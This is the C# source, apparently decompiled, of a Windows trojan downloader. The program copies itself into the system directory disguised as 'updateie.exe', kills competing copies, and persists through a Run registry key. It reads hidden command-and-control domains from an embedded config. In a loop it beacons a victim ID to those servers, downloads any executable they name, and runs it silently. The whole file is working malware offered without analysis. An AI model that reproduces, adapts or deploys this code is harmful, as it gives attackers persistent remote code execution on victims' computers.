using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Reflection;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace Download;

internal static class Program
{
	public static Saving sv;

	private static Mutex m_mutex;

	public static string drr = null;

	public static RegistryKey softwareKey = Registry.LocalMachine.OpenSubKey("Software", writable: true);

	public static RegistryKey hkMine = softwareKey.CreateSubKey("DownLoad");

	[STAThread]
	private static void Main()
	{
		DateTime now = DateTime.Now;
		string text = "";
		text += now.Day;
		text += now.Month;
		text += now.Year;
		text += now.Hour;
		text += now.Minute;
		text += now.Second;
		if (hkMine.GetValue("ID") == null)
		{
			hkMine.SetValue("ID", text);
		}
		Application.EnableVisualStyles();
		Application.SetCompatibleTextRenderingDefault(false);
		string systemDirectory = Environment.SystemDirectory;
		string startupPath = Application.get_StartupPath();
		try
		{
			if (systemDirectory.ToLower() != startupPath.ToLower())
			{
				startupPath = Application.get_ExecutablePath();
				try
				{
					FileInfo fileInfo = new FileInfo(Application.get_ExecutablePath());
					if (!fileInfo.Exists)
					{
						return;
					}
					if (fileInfo.Length < 16900L)
					{
						Application.Run((Form)(object)new Frm1());
						return;
					}
					systemDirectory = Environment.SystemDirectory + "\\updateie.exe";
					FileInfo fileInfo2 = new FileInfo(systemDirectory);
					drr = systemDirectory;
					if (fileInfo2.Exists)
					{
						Process.GetCurrentProcess();
						Process[] processes = Process.GetProcesses(".");
						Process[] array = processes;
						foreach (Process process in array)
						{
							string text2 = null;
							text2 = "updateie.exe";
							text2 = text2.Substring(0, text2.LastIndexOf("."));
							if (process.ProcessName == text2 && Assembly.GetExecutingAssembly().Location.Replace("/", "\\") != process.MainModule!.FileName)
							{
								process.Kill();
							}
						}
					}
					fileInfo2.Delete();
					File.Copy(startupPath, systemDirectory);
					hkMine.SetValue("tmp_dir", Application.get_ExecutablePath());
					RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\", writable: true);
					registryKey.SetValue("DowloadEr", systemDirectory);
					ProcessStartInfo processStartInfo = new ProcessStartInfo();
					processStartInfo.FileName = "cmd.exe";
					processStartInfo.Arguments = "/c " + systemDirectory;
					processStartInfo.UseShellExecute = false;
					processStartInfo.CreateNoWindow = true;
					Process.Start(processStartInfo);
					Application.Exit();
					return;
				}
				catch (Exception)
				{
					try
					{
						Thread.Sleep(1000);
						systemDirectory = Environment.SystemDirectory + "\\updateie.exe";
						FileInfo fileInfo2 = new FileInfo(systemDirectory);
						drr = systemDirectory;
						if (fileInfo2.Exists)
						{
							Process.GetCurrentProcess();
							Process[] processes = Process.GetProcesses(".");
							Process[] array = processes;
							foreach (Process process in array)
							{
								string text2 = null;
								text2 = "updateie.exe";
								text2 = text2.Substring(0, text2.LastIndexOf("."));
								if (process.ProcessName == text2 && Assembly.GetExecutingAssembly().Location.Replace("/", "\\") != process.MainModule!.FileName)
								{
									process.Kill();
								}
							}
						}
						fileInfo2.Delete();
						File.Copy(startupPath, systemDirectory);
						hkMine.SetValue("tmp_dir", Application.get_ExecutablePath());
						RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\", writable: true);
						registryKey.SetValue("DownloadEr", systemDirectory);
						ProcessStartInfo processStartInfo = new ProcessStartInfo();
						processStartInfo.FileName = "cmd.exe";
						processStartInfo.Arguments = "/c " + systemDirectory;
						processStartInfo.UseShellExecute = false;
						processStartInfo.CreateNoWindow = true;
						Process.Start(processStartInfo);
						Application.Exit();
						return;
					}
					catch (Exception)
					{
						return;
					}
				}
			}
			if (InstanceExists())
			{
				return;
			}
			string domain = null;
			string domain2 = null;
			int num = 10;
			if (hkMine.GetValue("tmp_dir") != null)
			{
				FileStream fileStream = new FileStream(hkMine.GetValue("tmp_dir")!.ToString(), FileMode.Open, FileAccess.Read);
				byte[] array2 = new byte[20000];
				char[] array3 = new char[20000];
				if (fileStream.CanSeek)
				{
					fileStream.Seek(0L, SeekOrigin.Begin);
					fileStream.Read(array2, 0, 20000);
					Decoder decoder = Encoding.UTF8.GetDecoder();
					decoder.GetChars(array2, 0, array2.Length, array3, 0);
					string str = new string(array3);
					str = Extract(str, "\adomain1\adomain2\atimeOut\tdest_file", "\v", 1);
					string text3 = Extract(str, "tr", "tr", 1);
					domain = text3;
					hkMine.SetValue("Domain1", text3);
					string text4 = Extract(str, "tr", "tr", 3);
					domain2 = text4;
					hkMine.SetValue("Domain2", text4);
					string text5 = Extract(str, "tr", "tr", 5);
					num = int.Parse(text5);
					hkMine.SetValue("TimeOut", text5);
					Extract(str, "tr", "tr", 7);
				}
				fileStream.Close();
				FileInfo fileInfo3 = new FileInfo(hkMine.GetValue("tmp_dir")!.ToString());
				if (fileInfo3.Exists)
				{
					fileInfo3.Delete();
				}
				hkMine.DeleteValue("tmp_dir", throwOnMissingValue: true);
			}
			else
			{
				domain = hkMine.GetValue("Domain1")!.ToString();
				domain2 = hkMine.GetValue("Domain2")!.ToString();
				num = int.Parse(hkMine.GetValue("TimeOut")!.ToString());
			}
			int num2 = 0;
			while (true)
			{
				try
				{
					Request_Post(domain, hkMine.GetValue("ID")!.ToString());
					num2++;
					string text6 = Request(domain, hkMine.GetValue("ID")!.ToString());
					if (text6 != "")
					{
						text6 = Extract(text6, "RUN", "RUN>", 1);
						text6 = Extract(text6, ">", "</", 1);
						Uri remoteURL = new Uri(text6);
						string text7 = Environment.SystemDirectory + "\\updatefile.exe";
						Download(remoteURL, text7);
						ProcessStartInfo processStartInfo = new ProcessStartInfo();
						processStartInfo.FileName = "cmd.exe";
						processStartInfo.Arguments = "/c " + text7;
						processStartInfo.UseShellExecute = false;
						processStartInfo.CreateNoWindow = true;
						Process.Start(processStartInfo);
						Thread.Sleep(num * 60000);
					}
					else if (num2 == 1)
					{
						Thread.Sleep(10000);
					}
					else
					{
						Thread.Sleep(num * 60000);
						num2 = 0;
					}
				}
				catch (Exception)
				{
					try
					{
						Request_Post(domain2, hkMine.GetValue("ID")!.ToString());
						num2++;
						string text6 = Request(domain2, hkMine.GetValue("ID")!.ToString());
						if (text6 != "")
						{
							text6 = Extract(text6, "RUN", "RUN>", 1);
							text6 = Extract(text6, ">", "</", 1);
							Uri remoteURL = new Uri(text6);
							string text7 = Environment.SystemDirectory + "\\updatefile.exe";
							Download(remoteURL, text7);
							ProcessStartInfo processStartInfo = new ProcessStartInfo();
							processStartInfo.FileName = "cmd.exe";
							processStartInfo.Arguments = "/c " + text7;
							processStartInfo.UseShellExecute = false;
							processStartInfo.CreateNoWindow = true;
							Process.Start(processStartInfo);
							Thread.Sleep(num * 60000);
						}
						else if (num2 == 1)
						{
							Thread.Sleep(10000);
						}
						else
						{
							Thread.Sleep(num * 60000);
							num2 = 0;
						}
					}
					catch (Exception)
					{
						num2++;
						if (num2 == 1)
						{
							Thread.Sleep(10000);
							continue;
						}
						Thread.Sleep(num * 60000);
						num2 = 0;
					}
				}
			}
		}
		catch (Exception)
		{
		}
	}

	public static string Request_Post(string domain, string id)
	{
		if (domain.IndexOf("ttp://") < 1)
		{
			domain = "http://" + domain;
		}
		HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(domain + "/newuser.php");
		httpWebRequest.AllowAutoRedirect = true;
		httpWebRequest.Method = "POST";
		httpWebRequest.ContentType = "application/x-www-form-urlencoded";
		string s = "userid=" + id;
		byte[] bytes = Encoding.ASCII.GetBytes(s);
		httpWebRequest.ContentLength = bytes.Length;
		Stream requestStream = httpWebRequest.GetRequestStream();
		requestStream.Write(bytes, 0, bytes.Length);
		requestStream.Close();
		HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
		Stream responseStream = httpWebResponse.GetResponseStream();
		StreamReader streamReader = new StreamReader(responseStream);
		return streamReader.ReadToEnd();
	}

	public static void DownloadBinaryFile(HttpWebResponse response, string filename)
	{
		byte[] array = new byte[4096];
		FileStream fileStream = new FileStream(filename, FileMode.Create);
		Stream responseStream = response.GetResponseStream();
		int num = 0;
		do
		{
			num = responseStream.Read(array, 0, array.Length);
			if (num > 0)
			{
				fileStream.Write(array, 0, num);
			}
		}
		while (num > 0);
		response.Close();
		responseStream.Close();
		fileStream.Close();
	}

	public static void Download(Uri remoteURL, string localFile)
	{
		WebRequest webRequest = WebRequest.Create(remoteURL);
		HttpWebResponse response = (HttpWebResponse)webRequest.GetResponse();
		DownloadBinaryFile(response, localFile);
	}

	public static string Request(string domain, string id)
	{
		if (domain.IndexOf("ttp://") < 1)
		{
			domain = "http://" + domain;
		}
		string requestUriString = domain + "/comm.php?userid=" + id;
		HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(requestUriString);
		httpWebRequest.AllowAutoRedirect = true;
		HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
		Stream responseStream = httpWebResponse.GetResponseStream();
		StreamReader streamReader = new StreamReader(responseStream);
		return streamReader.ReadToEnd();
	}

	public static string Extract(string str, string token1, string token2, int count)
	{
		int num = 0;
		int num2 = 0;
		do
		{
			num2 = str.IndexOf(token1, num2 + 1);
			if (num2 != -1)
			{
				count--;
				continue;
			}
			return null;
		}
		while (count > 0);
		num = str.IndexOf(token2, num2 + 1);
		if (num == -1)
		{
			return null;
		}
		num2 += token1.Length;
		return str.Substring(num2, num - num2);
	}

	private static bool InstanceExists()
	{
		m_mutex = new Mutex(initiallyOwned: false, "dwn", out var createdNew);
		return !createdNew;
	}
}
